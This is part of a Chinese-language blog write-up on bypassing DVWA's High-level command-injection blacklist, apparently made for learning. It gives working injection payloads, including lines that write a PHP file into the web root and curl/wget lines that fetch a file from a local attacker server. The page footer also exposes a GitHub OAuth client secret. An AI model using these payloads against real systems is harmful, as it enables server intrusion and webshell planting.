</span><span class=c1></span>    <span class=nv>$target</span> <span class=o>=</span> <span class=nx>trim</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span> <span class=s1>&#39;ip&#39;</span> <span class=p>]);</span>

    <span class=c1>// Set blacklist
</span><span class=c1></span>    <span class=nv>$substitutions</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
        <span class=s1>&#39;&amp;&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;;&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;| &#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;-&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;$&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;(&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;)&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;`&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;||&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
    <span class=p>);</span>

    <span class=c1>// Remove any of the charactars in the array (blacklist).
</span><span class=c1></span>    <span class=nv>$target</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span> <span class=nx>array_keys</span><span class=p>(</span> <span class=nv>$substitutions</span> <span class=p>),</span> <span class=nv>$substitutions</span><span class=p>,</span> <span class=nv>$target</span> <span class=p>);</span>

    <span class=c1>// Determine OS and execute the ping command.
</span><span class=c1></span>    <span class=k>if</span><span class=p>(</span> <span class=nx>stristr</span><span class=p>(</span> <span class=nx>php_uname</span><span class=p>(</span> <span class=s1>&#39;s&#39;</span> <span class=p>),</span> <span class=s1>&#39;Windows NT&#39;</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
        <span class=c1>// Windows
</span><span class=c1></span>        <span class=nv>$cmd</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span> <span class=s1>&#39;ping  &#39;</span> <span class=o>.</span> <span class=nv>$target</span> <span class=p>);</span>
    <span class=p>}</span>
    <span class=k>else</span> <span class=p>{</span>
        <span class=c1>// *nix
</span><span class=c1></span>        <span class=nv>$cmd</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span> <span class=s1>&#39;ping  -c 4 &#39;</span> <span class=o>.</span> <span class=nv>$target</span> <span class=p>);</span>
    <span class=p>}</span>

    <span class=c1>// Feedback for the end user
</span><span class=c1></span>    <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;</span><span class=si>{</span><span class=nv>$cmd</span><span class=si>}</span><span class=s2>&lt;/pre&gt;&#34;</span><span class=p>;</span>
<span class=p>}</span>

<span class=cp>?&gt;</span><span class=err>
</span></code></pre></div><p>ç‹å¾·å‘ï¼Ÿ</p>
<p>è¿™ä¸æ˜¯å·²ç»æ»¤æ‰äº† <code>||</code> å—ï¼Œä¸ºä»€ä¹ˆ <code>notexists || echo 123</code> è¿™ä¸ª payload è¿˜æ˜¯æ˜¾ç¤ºäº† <code>123</code>ï¼Ÿ</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422153514135.png width=888 height=660 srcset="/blog/p/get-start-dvwa-02/image-20220422153514135_hu6b2ed04736f2e8efc9ef7677bd7cca8b_48230_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422153514135_hu6b2ed04736f2e8efc9ef7677bd7cca8b_48230_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422153514135 class=gallery-image data-flex-grow=134 data-flex-basis=322px></p>
<p>æˆ‘ä¸ç†è§£ï¼Œå¤§å—éœ‡æ’¼ã€‚å¹²è„†å¼€äº†ä¸ª php è§£é‡Šå™¨è¯•ä¸€è¯• <code>str_replace</code> åˆ°åº•æ›¿æ¢å‡ºæ¥ä¸ªä»€ä¹ˆé¬¼ã€‚</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
    <span class=c1>// Get input
</span><span class=c1></span>    <span class=nv>$target</span> <span class=o>=</span> <span class=s1>&#39;notexists || echo 123&#39;</span><span class=p>;</span>

    <span class=c1>// Set blacklist
</span><span class=c1></span>    <span class=nv>$substitutions</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
        <span class=s1>&#39;&amp;&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;;&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;| &#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;-&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;$&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;(&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;)&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;`&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
        <span class=s1>&#39;||&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
    <span class=p>);</span>

    <span class=c1>// Remove any of the charactars in the array (blacklist).
</span><span class=c1></span>    <span class=nv>$target</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span> <span class=nx>array_keys</span><span class=p>(</span> <span class=nv>$substitutions</span> <span class=p>),</span> <span class=nv>$substitutions</span><span class=p>,</span> <span class=nv>$target</span> <span class=p>);</span>

    <span class=k>echo</span> <span class=s1>&#39;ping -c 4 &#39;</span> <span class=o>.</span> <span class=nv>$target</span>
<span class=cp>?&gt;</span><span class=err>
</span></code></pre></div><p>ç»“æœæ˜¯<code>ping -c 4 notexists |echo 123</code>ã€‚çœ‹èµ·æ¥æ˜¯ <code>str_replace</code> çš„ç”¨æ³•æœ‰è¯¯ï¼Œå¯¼è‡´å®é™…æ›¿æ¢æ‰çš„æ˜¯ <code>|</code> è€Œä¸æ˜¯ <code>||</code>ã€‚</p>
<p>php å®˜æ–¹æ–‡æ¡£ï¼ˆ8.1ï¼‰å¦‚æ˜¯è¯´ï¼š</p>
<blockquote>
<p>If <code>search</code> and <code>replace</code> are arrays, then <strong>str_replace()</strong> takes a value from each array and uses them to search and replace on <code>subject</code>. If <code>replace</code> has fewer values than <code>search</code>, then an empty string is used for the rest of replacement values. If <code>search</code> is an array and <code>replace</code> is a string, then this replacement string is used for every value of <code>search</code>. The converse would not make sense, though.</p>
</blockquote>
<p>DVWA å®¹å™¨çš„ PHP ç‰ˆæœ¬æ˜¯ 7.0 ï¼Œå§‘ä¸”å½“æ²¡å˜ã€‚é‚£é—®é¢˜å°±åœ¨äº <code>str_replace</code> çš„æ›¿æ¢æ–¹æ³•äº†ï¼Œæˆ‘çŒœ&mldr;&mldr;å½“ <code>search</code> æ˜¯ <code>array</code> çš„æ—¶å€™ï¼Œ<code>str_replace</code> å®é™…æ˜¯è¿™æ ·å¹²çš„ï¼š</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=k>for</span> <span class=nx>_</span><span class=p>,</span> <span class=nx>pattern</span> <span class=o>:=</span> <span class=k>range</span> <span class=nx>search</span> <span class=p>{</span>
    <span class=nx>subject</span> <span class=p>=</span> <span class=nf>replace</span><span class=p>(</span><span class=nx>pattern</span><span class=p>,</span> <span class=nx>subject</span><span class=p>)</span>
<span class=p>}</span>
</code></pre></div><p>ç®€å•å®éªŒéªŒè¯ä¸‹ã€‚</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=k>echo</span> <span class=nx>str_replace</span><span class=p>(</span><span class=k>array</span><span class=p>(</span><span class=s2>&#34;a&#34;</span><span class=p>,</span><span class=s2>&#34;ab&#34;</span><span class=p>),</span><span class=s2>&#34;c&#34;</span><span class=p>,</span><span class=s2>&#34;aabbcc&#34;</span><span class=p>);</span> <span class=c1>// ccbbcc
</span></code></pre></div><p>ä½†å³ä½¿å¦‚æ­¤ï¼Œä¹Ÿåº”è¯¥æ›¿æ¢æ‰ <code>||</code> ä¸¤ä¸ªå­—ç¬¦æ‰å¯¹å•Š&mldr;</p>
<p>æœ€åæ‰å‘ç°ï¼Œæ›¿æ¢çš„æ¨¡å¼æ˜¯ <code>| </code>ï¼ˆåœ¨<code>|</code>åé¢å¤šä¸€ä¸ªç©ºæ ¼ï¼‰ï¼Œæ‰€ä»¥åªæ›¿æ¢æ‰äº† <code>|| </code>çš„åä¸€ä¸ª <code>| </code>&mldr;&mldr;</p>
<p>äº‹å®è¯æ˜è§†åŠ›è¿˜æ˜¯å¾ˆé‡è¦çš„ï¼Œå°‘æ‰“sc2ï¼Œæ²¡çæ—©è¯¥çœ‹åˆ°äº†ã€‚</p>
<p>æ®æ­¤å¯ä»¥å†æ”¹ä¸€æ”¹ payloadï¼Œå·²çŸ¥ <code>||</code>ä¼šè¢«æ›¿æ¢æˆ <code>|</code>ï¼Œç®¡é“è¿ç®—ç¬¦ä¼šæŠŠä¸Šä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºæ¥åˆ°ä¸‹ä¸€ä¸ªå‘½ä»¤çš„ stdin è¾“å…¥ã€‚æ­£å¥½ï¼Œ<code>echo</code> ä¸è¯» stdinï¼Œç›´æ¥<code>echo '&lt;?php phpinfo(); ?>' > /var/www/html/1.php</code> çš„æ–¹æ³•åº”è¯¥ä¸å—å½±å“ã€‚</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220422160740919.png width=448 height=143 srcset="/blog/p/get-start-dvwa-02/image-20220422160740919_hu5b9f61819af5c6eaa13b971071838e17_5816_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220422160740919_hu5b9f61819af5c6eaa13b971071838e17_5816_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220422160740919 class=gallery-image data-flex-grow=313 data-flex-basis=751px></p>
<p>å€’æ˜¯æ²¡æŠ¥ 404ï¼Œå¯æ˜¯ç™½å±äº†ã€‚ä» DVWA çš„æ—¥å¿—è§‚å¯Ÿåˆ°ä¸‹é¢çš„è®°å½•ï¼š</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>[Fri Apr 22 08:07:20.601596 2022] [:error] [pid 312] [client 10.0.2.2:51105] PHP Notice:  Use of undefined constant phpinfo - assumed &#39;phpinfo&#39; in /var/www/html/2.php on line 1
</code></pre></div><p>è¿™å€’æ˜¯å¾ˆæ–°é²œï¼Œ<code>phpinfo</code>ä¸åº”è¯¥æ˜¯å…¨å±€çš„å—ï¼Ÿ</p>
<blockquote>
<p>æˆ‘åˆå‚»é€¼äº†ã€‚</p>
</blockquote>
<p>ç»è¿‡åå‡ åˆ†é’Ÿçš„è„‘æ®‹å¼æ€è€ƒï¼Œå¿½ç„¶æ„è¯†åˆ° <code>(</code> å’Œ <code>)</code> ä¹Ÿåœ¨è¿‡æ»¤æ¸…å•é‡Œï¼Œå“¦æ·¦ï¼å¥½å§ï¼Œç›´æ¥åœ¨è¿™é‡Œæ³¨å…¥ php ä»£ç çœ‹æ¥é™åˆ¶æœ‰ç‚¹å¤ªå¤šäº†ï¼Œæ’ä¸ª<code>curl</code>å‘½ä»¤è®©å®ƒä¸‹è½½å¾—äº†ã€‚</p>
<p>æœ¬åœ°ç”¨ <code>python3 -m http.server</code>å‘½ä»¤å¯åŠ¨ä¸€ä¸ª http æœåŠ¡å™¨ï¼Œç„¶å <code>ip addr show docker0</code> çœ‹ä¸€çœ¼æœ¬æœº ipï¼ŒæŠŠ payload æ”¹æˆ <code>notexists || curl http://172.17.0.1:8000/2.php -O /var/www/html/2.php</code> ï¼Œå…ˆæ‰¾ä¸ª playground è¯•ä¸€è¯•è¿‡æ»¤åçš„å‘½ä»¤æ˜¯ä»€ä¹ˆæ ·ã€‚</p>
<p><code>ping -c 4 notexists |curl http://172.17.0.1:8000/2.php O /var/www/html/2.php</code></p>
<p>å‘ç° <code>-</code> ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œ<code>-O</code>å‚æ•°ä¸èƒ½ç”¨ã€‚æƒ³åˆ°çœ‹çœ‹ php é»˜è®¤è¿è¡Œç›®å½•æ˜¯å“ªé‡Œï¼Œç›´æ¥ <code>wget</code> ä¸‹è½½åˆ°å½“å‰ç›®å½•ä¹Ÿå¯ä»¥ã€‚ç„¶ååˆæƒ³åˆ°å¯ä»¥å†æ‹¼ä¸€ä¸ª <code>|| mv 2.php /var/www/html/2.php</code> ç§»åŠ¨è¿‡å»ã€‚å†è¯•ä¸€è¯•ã€‚</p>
<p><code>ping -c 4 notexists |wget http://172.17.0.1:8000/2.php |mv 2.php /var/www/html/2.php</code></p>
<p>ç°åœ¨çœ‹èµ·æ¥æœ‰æœºä¼šè¿è¡Œäº†ï¼Œç»“æœæŠ¥é”™<code>wget: not found</code>ã€‚</p>
<p>è¡Œå§ã€‚ä¹–ä¹–<code>curl</code>ï¼Œpayload æ”¹æˆ <code>notexists || curl http://172.17.0.1:8000/2.php || tee /var/www/html/2.php</code>ã€‚æ›´å±‘çš„äº‹æƒ…å‘ç”Ÿäº†ï¼š<code>curl: not found</code>ã€‚</p>
<p>æ€ä¹ˆä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Ÿæ²ƒæ—¥ã€‚æ‹¼ä¸€å¥ <code>|| ls /usr/bin</code>çœ‹çœ‹æœ‰å•¥å¯ä»¥ç”¨çš„ï¼ŒæƒŠå–œåœ°å‘ç°å±…ç„¶æœ‰ä¸ª <code>rsync</code>ï¼Œè¿™ä¸‹æ€»è¯¥çœäº‹äº†å§ï¼Œç»“æœåŠå¤©æ²¡æå‡ºæ¥åŒ¿åè®¿é—®çš„ rsync daemonã€‚</p>
<p>ä¸€çœ‹æ—¶é—´å¿«ä¸‹ç­äº†ï¼Œçªç„¶æ„è¯†åˆ°å…¶å®æœ‰ <code>base64</code> å¯ä»¥ç”¨=ã€‚=ï¼Œè¿˜æœ‰<code>printf</code>è½¬ä¹‰<code>\x</code> éƒ½èƒ½bypassã€‚æ€ä¹ˆä¸€åˆ°ä¸‹ç­æ—¶é—´å°±æ‰æ€æ³‰æ¶Œã€‚</p>
<p>payload æ”¹æˆ <code>notexists || printf '&lt;?php phpinfo\x28\x29\x3b ?>' > /var/www/html/2.php</code>ï¼Œç»“æœå‘ç°ä¾ç„¶ä¸è¡Œã€‚ä¸ºä»€ä¹ˆï¼Ÿå¤´éƒ½è¦ç‚¸äº†ã€‚<code>base64 -d</code>çš„<code>-</code>ä¼šè¢«è¿‡æ»¤æ•…ä¸èƒ½è€ƒè™‘ï¼Œ<code>printf</code>çš„<code>\x</code>è½¬ä¹‰åºåˆ—æ€ä¹ˆä¼šä¸è¡Œï¼Œè°·æ­Œäº†ä¸€ç•ª<a class=link href=https://stackoverflow.com/questions/66844155/bin-sh-does-not-recognize-hexadecimal-escape-sequences target=_blank rel=noopener>åœ¨çˆ†æ ˆçœ‹åˆ°ä¸ªå›ç­”</a>ï¼š</p>
<blockquote>
<p>Because escape sequences in <code>\xdd</code> form (where each <code>d</code> represents a hexadecimal digit) are a GNU extension and not available everywhere. But octals are widely supported (and <a class=link href=https://pubs.opengroup.org/onlinepubs/9699919799/utilities/printf.html#tag_05 target=_blank rel=noopener>standardized</a>), so you can use:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=nb>printf</span> <span class=s1>&#39;%b&#39;</span> <span class=s1>&#39;\0220&#39;</span>
</code></pre></div></blockquote>
<p>å¥½å˜›ï¼Œæ‰€ä»¥è¯´ <code>\x</code> è½¬ä¹‰åºåˆ—è¿˜ä¸å¤Ÿ portable æ˜¯å§ã€‚<code>\0</code>è½¬ä¹‰åºåˆ—è¦ç”¨ 8 è¿›åˆ¶ç¼–ç ï¼Œäºæ˜¯æˆ‘å†æ¬¡æ”¹äº†ä¸€ä¸‹ payload &mldr;</p>
<p><code>notexists|printf '&lt;?php phpinfo\050\051\073 ?>' > /var/www/html/2.php</code>ï¼ŒæŠŠ <code>\x</code> è½¬ä¹‰åºåˆ—æ”¹æˆäº† <code>\0</code>ï¼Œè¿™æ¬¡æ²¡é—®é¢˜äº†ã€‚</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220424142807468.png width=1268 height=373 srcset="/blog/p/get-start-dvwa-02/image-20220424142807468_hu3e708c4ffaea9e97136cc32ff74411e9_40468_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220424142807468_hu3e708c4ffaea9e97136cc32ff74411e9_40468_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220424142807468 class=gallery-image data-flex-grow=339 data-flex-basis=815px></p>
<p>æ­¤å¤–è¿˜æƒ³åˆ°å¦ä¸€ç§è§£æ³•ï¼Œè€ƒè™‘<code>sh</code>ï¼ˆ<code>csh</code>æˆ–è€…<code>dash</code>ï¼Œ<code>ash</code>ï¼Ÿï¼‰ä¸åƒ<code>\x</code>ï¼Œè¦æ˜¯å¯¹<code>\0</code>ä¹Ÿä¸åƒè¿˜æœ‰ç§æ¯”è¾ƒç‹—çš„åŠæ³•ï¼Œ<code>printf "printf \"\\x28\\x29\""|bash</code>ï¼Œç”¨<code>\\</code>è½¬ä¹‰ç•™ä¸‹åæ–œæ ï¼Œç„¶åä¼ ç»™<code>bash</code>æ‰§è¡Œã€‚<code>bash</code>å¤§æ¦‚ç‡æ˜¯èƒ½åƒä¸‹<code>\x</code>è½¬ä¹‰åºåˆ—çš„ï¼Œäºæ˜¯å°±é—´æ¥å®ç°äº†<code>printf \x28\x29</code>ã€‚</p>
<p>ä¼ <code>notexists|printf "printf \"\\x28\""|bash</code>è¿™ä¸ª payload å¯ä»¥çœ‹åˆ°å›æ˜¾ <code>(</code>ï¼Œè¯´æ˜è¿™ä¸ªæ€è·¯æ˜¯ ok çš„ã€‚</p>
<p><img src=/blog/p/get-start-dvwa-02/image-20220424143511245.png width=479 height=121 srcset="/blog/p/get-start-dvwa-02/image-20220424143511245_hu44e5cd97c663482ba2f8b28582fad915_4810_480x0_resize_box_3.png 480w, /blog/p/get-start-dvwa-02/image-20220424143511245_hu44e5cd97c663482ba2f8b28582fad915_4810_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220424143511245 class=gallery-image data-flex-grow=395 data-flex-basis=950px></p>
<h2 id=æ€»ç»“>æ€»ç»“</h2>
<p>Brute Force æ¯”è¾ƒç®€å•ï¼Œä¸æã€‚</p>
<p>Command Injection å…¶å®ä¸€ç›´åˆ° High éš¾åº¦éƒ½è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼ŒHigh éš¾åº¦ä¸‹ç•™äº†<code>|</code>ç®¡é“ç¬¦å¯ä»¥ç”¨ï¼Œæ•´ä¸ªæ³¨å…¥å°±æ²¡å•¥éš¾åº¦äº†ã€‚</p>
<p>è¿™å°±è®©æˆ‘æƒ³åˆ°äº†æ€ä¹ˆå†™ <code>ping</code> è¿™ä¸ªæ¡ˆä¾‹æ‰èƒ½åšåˆ°æœç»å‘½ä»¤æ³¨å…¥ï¼Ÿ</p>
<p><code>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}</code>æ­£åˆ™åŒ¹é…ä¸€ä¸‹ï¼Œæ„Ÿè§‰ä¸Šé¢ç©çš„é‚£äº›èŠ±æ ·å°±æ¯«æ— æ„ä¹‰äº†ã€‚</p>
<p>Impossible éš¾åº¦ä¸‹ Command Injection å˜æˆäº†è¿™æ ·</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php>    <span class=c1>// Get input
</span><span class=c1></span>    <span class=nv>$target</span> <span class=o>=</span> <span class=nv>$_REQUEST</span><span class=p>[</span> <span class=s1>&#39;ip&#39;</span> <span class=p>];</span>
    <span class=nv>$target</span> <span class=o>=</span> <span class=nx>stripslashes</span><span class=p>(</span> <span class=nv>$target</span> <span class=p>);</span>

    <span class=c1>// Split the IP into 4 octects
</span><span class=c1></span>    <span class=nv>$octet</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span> <span class=s2>&#34;.&#34;</span><span class=p>,</span> <span class=nv>$target</span> <span class=p>);</span>

    <span class=c1>// Check IF each octet is an integer
</span><span class=c1></span>    <span class=k>if</span><span class=p>(</span> <span class=p>(</span> <span class=nx>is_numeric</span><span class=p>(</span> <span class=nv>$octet</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span> <span class=nx>is_numeric</span><span class=p>(</span> <span class=nv>$octet</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span> <span class=nx>is_numeric</span><span class=p>(</span> <span class=nv>$octet</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span> <span class=nx>is_numeric</span><span class=p>(</span> <span class=nv>$octet</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span> <span class=nx>sizeof</span><span class=p>(</span> <span class=nv>$octet</span> <span class=p>)</span> <span class=o>==</span> <span class=mi>4</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
        <span class=c1>// If all 4 octets are int&#39;s put the IP back together.
</span><span class=c1></span>        <span class=nv>$target</span> <span class=o>=</span> <span class=nv>$octet</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>.</span> <span class=s1>&#39;.&#39;</span> <span class=o>.</span> <span class=nv>$octet</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>.</span> <span class=s1>&#39;.&#39;</span> <span class=o>.</span> <span class=nv>$octet</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>.</span> <span class=s1>&#39;.&#39;</span> <span class=o>.</span> <span class=nv>$octet</span><span class=p>[</span><span class=mi>3</span><span class=p>];</span>
<span class=c1>//...
</span></code></pre></div><p>æˆ‘æ˜¯æœ‰ç‚¹éš¾ç†è§£ä¸ºä»€ä¹ˆè¿˜æ˜¯ç”¨è¿™ç§æ¯”è¾ƒç³™çš„æ‰‹æ®µéªŒè¯=ã€‚=æ­£åˆ™åŒ¹é…ä¸‹ä¸è¡Œå—ï¼Ÿ<code>is_numeric</code>æ˜¯ä¸æ˜¯èƒ½ bypass æˆ‘ä¸å¤ªè‚¯å®šï¼Œä½†è¿™æ¡é•¿é•¿çš„<code>if</code>çœ‹èµ·æ¥å°±æ„Ÿè§‰æ˜¯æœ‰å‘çš„æ ·å­&mldr;</p>
<p>æ‰€ä»¥å§&mldr;åˆ°åº•å¤šå°‘è¿˜æœ‰ç‚¹è¿·æƒ‘ã€‚Impossible éš¾åº¦çš„å‘½ä»¤æ³¨å…¥ï¼Œæœªæ¥å†ç ”ç©¶ç ”ç©¶ï¼Œä¹Ÿè®¸ä¹‹åä¼šå†å†™ç¯‡åšå®¢çœ‹çœ‹ã€‚</p>
</section>
<footer class=article-footer>
<section class=article-tags>
<a href=/blog/tags/security/>security</a>
<a href=/blog/tags/dvwa/>dvwa</a>
</section>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
</footer>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css integrity=sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js integrity=sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8 crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js integrity=sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.querySelector(`.article-content`),{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script>
</article>
<aside class=related-contents--wrapper>
<h2 class=section-title>ç›¸å…³æ–‡ç« </h2>
<div class=related-contents>
<div class="flex article-list--tile">
<article>
<a href=/blog/p/get-start-dvwa-05/>
<div class=article-details>
<h2 class=article-title>DVWAä¸Šæ‰‹è®°å½•-æ–‡ä»¶ä¸Šä¼ </h2>
</div>
</a>
</article>
<article>
<a href=/blog/p/get-start-dvwa-04/>
<div class=article-details>
<h2 class=article-title>DVWAä¸Šæ‰‹è®°å½•-æ–‡ä»¶åŒ…å«</h2>
</div>
</a>
</article>
<article>
<a href=/blog/p/get-start-dvwa-03/>
<div class=article-details>
<h2 class=article-title>DVWAä¸Šæ‰‹è®°å½•-CSRF</h2>
</div>
</a>
</article>
<article>
<a href=/blog/p/get-start-dvwa-01/>
<div class=article-details>
<h2 class=article-title>DVWAä¸Šæ‰‹è®°å½•-åˆä½“éªŒ</h2>
</div>
</a>
</article>
<article>
<a href=/blog/p/get-start-dvwa-13/>
<div class=article-details>
<h2 class=article-title>DVWAä¸Šæ‰‹è®°å½•-JavaScript</h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<link rel=stylesheet href=https://unpkg.com/vssue/dist/vssue.min.css>
<div id=vssue></div>
<script src=https://unpkg.com/vue@2.6.14/dist/vue.runtime.min.js></script>
<script src=https://unpkg.com/vssue@1.4.8/dist/vssue.github.min.js></script>
<script>new Vue({el:"#vssue",render:a=>a("Vssue",{props:{title:"DVWAä¸Šæ‰‹è®°å½•-ç®€å•å°è¯•",options:{autoCreateIssue:!1,owner:"nnnewb",repo:"blog",clientId:"285910fdc1567a1a23e3",clientSecret:"f00da5438d9ac82c4a86024866c7a916ae411edc"}}})})</script>
<footer class=site-footer>
<section class=copyright>
&copy;
2021 -
2022 weakptr's ç¬”è®°
</section>
<section class=powerby>
GitHub Pages <br>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.10.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
